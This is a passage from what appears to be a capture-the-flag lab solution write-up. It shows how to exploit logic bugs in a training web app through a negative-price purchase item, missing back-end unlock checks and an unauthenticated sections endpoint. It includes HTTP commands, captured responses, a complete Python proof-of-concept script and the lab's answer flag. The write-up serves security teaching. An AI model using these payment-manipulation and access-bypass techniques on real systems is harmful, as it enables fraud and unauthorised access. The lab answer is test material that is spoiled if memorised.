      "endsWith": "3456",
      "expiryMonth": "12",
      "expiryYear": "9999",
      "cvc": "941",
      "balance": 0
    }
  ]
}
```

Subsequently, students need to construct the `JSON` object for the `items` field consisting of two purchase items along with `cardId` as the POST parameters (instead of doing it manually, students can intercept the request sent when clicking on "PAY NOW"); the below items allow gaining the `Platinum` subscription and 10000 `cubes`:

Code: json

```json
{
  "cardId": "651adc4626c2cbf251dbc949",
  "items": [
    {
      "name": "Platinum",
      "category": "subscription",
      "price": 68,
      "amount": 1
    },
    {
      "name": "10000",
      "category": "cubes",
      "price": -100,
      "amount": 1
    }
  ]
}
```

Students need to send the malicious purchase request to `/api/payment/charge`, noticing that the returned message shows a negative net amount:

Code: shell

```shell
echo -n '{"cardId":"651adc4626c2cbf251dbc949","items":[{"name":"Platinum","category":"subscription","price":68,"amount":1},{"name":"10000","category":"cubes","price":-100,"amount":1}]}' | http POST http://STMIP:STMPO/api/payment/charge --auth-type=jwt --auth="JWT" | jq
```

```
┌─[eu-academy-1]─[10.10.14.11]─[htb-ac-413848@htb-rpjwjd12ep]─[~]
└──╼ [★]$ echo -n '{"cardId":"651adc4626c2cbf251dbc949","items":[{"name":"Platinum","category":"subscription","price":68,"amount":1},{"name":"10000","category":"cubes","price":-100,"amount":1}]}' | http POST http://94.237.49.11:45562/api/payment/charge --auth-type=jwt --auth="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY1MWFkYTMyMjZjMmNiZjI1MWRiYzkwYiIsIm5hbWUiOiJwZWRhbnQiLCJ1c2VybmFtZSI6InBlZGFudCIsImVtYWlsIjoicGVkYW50QGh0Yi5jb20iLCJyZWdpc3RyYXRpb25EYXRlIjoiMjAyMy0xMC0wMlQxNDo1Njo1MC4yNzJaIiwiY3ViZXMiOjMwLCJzdWJzY3JpcHRpb24iOnsidXNlcklkIjoiNjUxYWRhMzIyNmMyY2JmMjUxZGJjOTBiIiwic3Vic2NyaXB0aW9uTmFtZSI6ImZyZWUiLCJleHBpcmVzQXQiOiIyMTAwLTAxLTAxVDAwOjAwOjAwLjAwMFoifSwiaWF0IjoxNjk2MjU4NjUzLCJleHAiOjE2OTYzNDUwNTN9.kBw7YKgD_EWsK0o2lRM9Wbch3xjDZU2M_bAyjEC_4iY" | jq

{
  "message": "Successfully processed payment for a total of $-32."
}
```

If students were to check their payment card's balance, they will notice that it became 32; this is because when updating the user's balance after a purchase (`src/src/controllers/payment-controllers.js`, lines 255-263), the function performs subtraction on `total`, which has a negative sign. According to a fundamental property in mathematics, the result will have a positive sign because `0 - (-32)` results in `+32`:

Code: js

```js
try {
    card.balance = card.balance - total;
    await PaymentCard.updateOne(
      {
        userId,
        _id: cardId,
      },
      card
    );
```

Students can send a GET request to `/api/payment/cards` to check the current payment card's balance:

Code: shell

```shell
http GET http://STMIP:STMPO/api/payment/cards --auth-type=jwt --auth="JWT" | jq .cards[]
```

```
┌─[eu-academy-1]─[10.10.15.152]─[htb-ac-413848@htb-z8xybdfnik]─[~]
└──╼ [★]$ http GET http://94.237.49.11:51452/api/payment/cards --auth-type=jwt --auth="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY1MWQ3ZjE0YWNkZDIyZmUwOGIzZDZhZiIsIm5hbWUiOiJwZWRhbnQiLCJ1c2VybmFtZSI6InBlZGFudCIsImVtYWlsIjoicGVkYW50QGh0Yi5jb20iLCJyZWdpc3RyYXRpb25EYXRlIjoiMjAyMy0xMC0wNFQxNTowNDo1Mi42NzVaIiwiY3ViZXMiOjMwLCJzdWJzY3JpcHRpb24iOnsidXNlcklkIjoiNjUxZDdmMTRhY2RkMjJmZTA4YjNkNmFmIiwic3Vic2NyaXB0aW9uTmFtZSI6ImZyZWUiLCJleHBpcmVzQXQiOiIyMTAwLTAxLTAxVDAwOjAwOjAwLjAwMFoifSwiaWF0IjoxNjk2NDMxOTIyLCJleHAiOjE2OTY1MTgzMjJ9.82D2ovtSWNy39hjKTHwTzybwverl30XXwuSesqW2U3c" | jq .cards[]

{
  "id": "651adc4626c2cbf251dbc949",
  "userId": "651ada3226c2cbf251dbc90b",
  "name": "paypal",
  "endsWith": "3456",
  "expiryMonth": "12",
  "expiryYear": "9999",
  "cvc": "941",
  "balance": 32
}
```

Once signed in, students will notice that they have gained the `Platinum` subscription (and a total of 11030 `cubes`), allowing all modules to be unlocked:

![[HTB Solutions/CWEE/z. images/789fe5d44410fe637748a7924c175046_MD5.jpg]]

The flag exists within the first section of the `Intro to Assembly Language` module, with its `id` being 11. However, the front-end prevents unlocking it due to its status being "Coming Soon":

![[HTB Solutions/CWEE/z. images/4aaae4a59288495e0f68dacde28356d4_MD5.jpg]]

The front-end relies on the `conditions` field of a module to determine whether it can be unlocked; for example, in the case of `Intro to Assembly Language` and `Penetration Testing Process`, both have "coming\_soon" for their `conditions` (array) field:

![[HTB Solutions/CWEE/z. images/ac0b5984ab7bdca1e517455d4960da9f_MD5.jpg]]

Nevertheless, when inspecting the `unlockModule` function (found within `src/src/controllers/modules-controllers.js`, lines 80-199), students will notice that when it unlocks a module for users with subscriptions (after passing multiple validation checks) without checking for any conditions, leading to a validation disparity logic bug:

![[HTB Solutions/CWEE/z. images/c3932b472763cfae2392ff83202ddfb7_MD5.jpg]]

Thus, regardless of the front-end preventing the module from being unlocked, the back-end does not enforce the same validations. Students need to attain a new JWT token and then unlock the module:

Code: shell

```shell
http GET http://STMIP:STMPO/api/modules/11/unlock --auth-type=jwt --auth="JWT" | jq
```

```
┌─[eu-academy-1]─[10.10.14.11]─[htb-ac-413848@htb-rgujdxlutm]─[~]
└──╼ [★]$ http GET http://94.237.59.185:47515/api/modules/11/unlock --auth-type=jwt --auth="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY1MWFlZmJjMWIyYTUwZTE0MDYwZmViMiIsIm5hbWUiOiJwZWRhbnQiLCJ1c2VybmFtZSI6InBlZGFudCIsImVtYWlsIjoicGVkYW50QGh0Yi5jb20iLCJyZWdpc3RyYXRpb25EYXRlIjoiMjAyMy0xMC0wMlQxNjoyODo0NC45OTJaIiwiY3ViZXMiOjExMDMwLCJzdWJzY3JpcHRpb24iOnsidXNlcklkIjoiNjUxYWVmYmMxYjJhNTBlMTQwNjBmZWIyIiwic3Vic2NyaXB0aW9uTmFtZSI6IlBsYXRpbnVtIiwiZXhwaXJlc0F0IjoiMjAyNC0wOS0yNlQxNjozMjo1NC43NjhaIn0sImlhdCI6MTY5NjI2NzU1OSwiZXhwIjoxNjk2MzUzOTU5fQ.Ol9Mas46GJGOar4q1Xj0EYtF3pmHgpZSZw0lIjsuXTg" | jq

{
  "unlocked": true
}
```

Even after signing out and signing in again, students will notice that the front-end still prevents viewing the module's sections/contents:

![[HTB Solutions/CWEE/z. images/f406667f85e6613ae8b5357bb34bf0af_MD5.jpg]]

However, when inspecting the routes in `src/src/routes/sections-routes.js`, mapped for `src/src/controllers/sections-controllers.js`, students will notice that there is an unauthenticated GET `/api/sections/:moduleId` endpoint that returns the sections of a module by passing its `id`:

![[HTB Solutions/CWEE/z. images/1a7f189780715ee336aac9be90917e98_MD5.jpg]]

Students need to retrieve the sections of the module with the `id` `11`, finding out that the `id` of the first section is `148`:

Code: shell

```shell
http GET http://STMIP:STMPO/api/sections/11 | jq
```

```
┌─[eu-academy-1]─[10.10.14.11]─[htb-ac-413848@htb-rgujdxlutm]─[~]
└──╼ [★]$ http GET http://94.237.59.185:47515/api/sections/11 | jq

{
  "sections": [
    {
      "isPractical": false,
      "_id": "651aef87477e331d368f048d",
      "id": 148,
      "moduleId": 11,
      "title": "Assembly Language"
    },
    {
      "isPractical": false,
      "_id": "651aef87477e331d368f048e",
      "id": 149,
      "moduleId": 11,
      "title": "Computer Architecture"
    },
    <SNIP>
  ]
}
```

Additionally, the endpoint `/api/sections/:moduleId/:sectionId` in `src/src/routes/sections-routes.js` allows retrieving a section's content by passing a module's `id` and a section's `id`:

![[HTB Solutions/CWEE/z. images/478a71b925e955e5481be724609a6786_MD5.jpg]]

Students need to send a GET request to `/api/sections/11/148`, where 11 represents the module's `id` and 148 represents the `id` of the desired section within the module where the flag is located. Students will obtain the flag `HTB{4_109!c_6u95_1!f3!}`:

Code: shell

```shell
http GET http://STMIP:STMPO/api/sections/11/148 --auth-type=jwt --auth="JWT" | jq
```

```
┌─[eu-academy-1]─[10.10.14.11]─[htb-ac-413848@htb-rgujdxlutm]─[~]
└──╼ [★]$ http GET http://94.237.59.185:47515/api/sections/11/148 --auth-type=jwt --auth="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY1MWFlZmJjMWIyYTUwZTE0MDYwZmViMiIsIm5hbWUiOiJwZWRhbnQiLCJ1c2VybmFtZSI6InBlZGFudCIsImVtYWlsIjoicGVkYW50QGh0Yi5jb20iLCJyZWdpc3RyYXRpb25EYXRlIjoiMjAyMy0xMC0wMlQxNjoyODo0NC45OTJaIiwiY3ViZXMiOjExMDMwLCJzdWJzY3JpcHRpb24iOnsidXNlcklkIjoiNjUxYWVmYmMxYjJhNTBlMTQwNjBmZWIyIiwic3Vic2NyaXB0aW9uTmFtZSI6IlBsYXRpbnVtIiwiZXhwaXJlc0F0IjoiMjAyNC0wOS0yNlQxNjozMjo1NC43NjhaIn0sImlhdCI6MTY5NjI2ODQ1NCwiZXhwIjoxNjk2MzU0ODU0fQ.9Dnb_ereFQmgQ0tdpEeZx1OfexUsAWoqH1XTa5S7F4Y" | jq

{
  "sectionContent": {
    "_id": "651aef875efbe142f32d83bc",
    "id": 148,
    "moduleId": 11,
    "content": "flag: HTB{4_109!c_6u95_1!f3!}"
  }
}
```

After understanding how to gain a 'Platinum' subscription and unlock modules to view their sections, students are highly encouraged to write a Proof of Concept (PoC) that automates the exploitation of the web app, eventually unlocking all modules and extracting the flag from the section(s) programmatically. One example of such a Python PoC is below:

Code: python

```python
import requests, json, string, random, argparse, re
from urllib.parse import urlsplit
from concurrent.futures import ThreadPoolExecutor

# Globals
STMIP = ""
STMPO = ""
TargetURL = ""
headers = {"Content-Type": "application/json"}

def RegisterUserAccount(name, username, email, password):
    # Register a user account
    registerEndpoint = "/api/users/register"
    postParametersRegister = {
        "name": f"{name}",
        "username": f"{username}",
        "email": f"{email}",
        "password": f"{password}",
    }

    requests.post(
        url=f"{TargetURL}{registerEndpoint}",
        data=json.dumps(postParametersRegister),
        headers=headers,
    )

def Login(email, password):
    # Login to attain JWT
    loginEndpoint = "/api/users/login"
    postParametersLogin = {"email": f"{email}", "password": f"{password}"}

    JWT = (
        (
            requests.post(
                url=f"{TargetURL}{loginEndpoint}",
                data=json.dumps(postParametersLogin),
                headers=headers,
            )
        )
        .json()
        .get("token")
    )
    return JWT

def AddPaymentCardAndGetID(JWT):
    # Add Payment Card to Current User
    addPaymentCardEndpoint = "/api/payment/add"
    postParametersAddPaymentCard = {
        "name": "PayPal",
        "number": f"{''.join(random.choices(string.digits, k= 16))}",
        "expiryMonth": "12",
        "expiryYear": "9999",
        "cvc": f"{''.join(random.choices(string.digits, k=3))}",
    }

    headers.update({"Authorization": f"Bearer {JWT}"})
    requests.post(
        url=f"{TargetURL}{addPaymentCardEndpoint}",
        data=json.dumps(postParametersAddPaymentCard),
        headers=headers,
    )

    getPaymentCardDetailsEndpoint = "/api/payment/cards"

    cardId = (
        requests.get(url=f"{TargetURL}{getPaymentCardDetailsEndpoint}", headers=headers)
    ).json()["cards"][0]["id"]

    return cardId

def BuyPlatinumSubscription(CardId):
    # Buy Platinum Subscription
    processPurchaesEndpoint = "/api/payment/charge/"

    postParametersBuyPlatinum = {
        "cardId": f"{CardId}",
        "items": [
            {"name": "Platinum", "category": "subscription", "price": 68, "amount": 1},
            {"name": "10000", "category": "cubes", "price": -100, "amount": 1},
        ],
    }

    requests.post(
        url=f"{TargetURL}{processPurchaesEndpoint}",
        data=json.dumps(postParametersBuyPlatinum),
        headers=headers,
    )

def UnlockAllModules(JWT):
    # Unlock All Modules
    getAllModulesEndpoint = "/api/modules/"
    response = (requests.get(f"{TargetURL}{getAllModulesEndpoint}")).json()
    moduleIds = [moduleId["id"] for moduleId in response["modules"]]

    headers.update({"Authorization": f"Bearer {JWT}"})
    unlockModulesEndpoint = "/api/modules/ID/unlock"
    for moduleId in moduleIds:
        response = requests.get(
            f"{TargetURL}{unlockModulesEndpoint.replace('ID', str(moduleId))}",
            headers=headers,
        )
    return moduleIds

def GetAllSectionsOfModules(moduleIds):
    # Get All Section IDs belonging to All Modules and Return them
    getSectionsOfModuleEndpoint = "/api/sections/MODULE_ID"
    allSections = []
    for moduleId in moduleIds:
        response = (
            requests.get(
                f"{TargetURL}{getSectionsOfModuleEndpoint.replace('MODULE_ID', str(moduleId))}"
            )
        ).json()
        sectionIds = [sectionId["id"] for sectionId in response["sections"]]
        for sectionId in sectionIds:
            allSections.append(f"{TargetURL}/api/sections/{moduleId}/{sectionId}")
    return allSections

def FindFlag(sectionAndJWT):
    # Get Content of every section within a module and search for the flag
    section, JWT = sectionAndJWT
    headers.update({"Authorization": f"Bearer {JWT}"})
    try:
        response = (requests.get(url=section, headers=headers)).json()
        sectionContent = response["sectionContent"]["content"]
        match = re.findall(r"HTB{.*?}", sectionContent)
        if match:
            print(f"[+] Found Flag: {match[0]}")
            print(f"[+] API GET Endpoint: {urlsplit(section).path}")
    except:
        pass

def main():
    argsParser = argparse.ArgumentParser()
    argsParser.add_argument("STMIP", help="Spawned Target Machine IP Address")
    argsParser.add_argument("STMPO", help="Spawned Target Machine Port")
    arguments = argsParser.parse_args()
    global STMIP, STMPO, TargetURL
    STMIP = arguments.STMIP
    STMPO = arguments.STMPO
    TargetURL = f"http://{STMIP}:{STMPO}"

    name = "".join(random.choices(string.ascii_letters, k=6))
    username = name
    email = f"{''.join(random.choices(string.ascii_letters, k = 6))}@htb.com"
    password = "".join(random.choices(string.ascii_letters + string.digits, k=10))

    print(
        f"\n[!]  Using the following email and password for PoC: {email}:{password}\n"
    )
    RegisterUserAccount(name, username, email, password)
    print(f"[+] Registered User Successfully!")
    JWT = Login(email, password)
    print(f"[+] Login Successful!")
    CardId = AddPaymentCardAndGetID(JWT)
    print(f"[+] Added Payment Card Successfully!")
    BuyPlatinumSubscription(CardId)
    print(f"[+] Bought Platinum Subscription Successfully!")
    # Get a new JWT after Buying Platinum Subscription
    NewJWT = Login(email, password)
    ModuleIds = UnlockAllModules(NewJWT)
    print(f"[+] Unlocked All Modules Successfully!")
    AllSections = GetAllSectionsOfModules(ModuleIds)

    argsList = zip(AllSections, [NewJWT] * len(AllSections))
    with ThreadPoolExecutor(max_workers=200) as threadPoolExecutor:
        threadPoolExecutor.map(FindFlag, argsList)

main()
```

After saving it to a file, students can run the script and provide it `STMIP` and `STMPO`:

Code: shell

```shell
python3 PoC.py STMIP STMPO
```

```
┌─[eu-academy-1]─[10.10.15.152]─[htb-ac-413848@htb-gztijyxh70]─[~]
└──╼ [★]$ python3 PoC.py 94.237.49.11 34847

[!]  Using the following email and password for PoC: pSGmso@htb.com:67jBSKAxRO

[+] Registered User Successfully!
[+] Login Successful!
[+] Added Payment Card Successfully!
[+] Bought Platinum Subscription Successfully!
[+] Unlocked All Modules Successfully!
[+] Found Flag: HTB{4_109!c_6u95_1!f3!}
[+] API GET Endpoint: /api/sections/11/148
```

Answer: `HTB{4_109!c_6u95_1!f3!}`